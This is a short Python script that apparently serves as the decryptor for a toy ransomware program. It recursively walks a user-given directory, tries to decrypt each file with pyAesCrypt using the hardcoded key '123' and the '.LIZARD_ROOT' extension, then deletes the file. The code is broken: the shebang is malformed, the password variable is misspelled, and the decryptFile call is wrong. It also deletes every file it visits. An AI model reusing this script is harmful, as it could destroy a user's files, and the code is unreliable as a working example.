#!usr/bin/python3

import os
import pyAesCrypt as crypt

directory_for_decrypt = str(input("Enter the director for decrypt ==> "))

def decrypt(file):
  passwrod = '123'
  buffer_sz = 512*1024
  crypt.decryptFile(file + file + ".LIZARD_ROOT", password, buffer_sz)
  print(f"File {file} decrypt")
  os.remove(file)
  
def search_dir(dir):
  for name in os.listdir(dir):
    path = os.path.join(dir, name)
    if os.path.isfile(path) == True:
      decrypt(path)
    else:
      search_dir(path)
      
search_dir(directory_for_decrypt)
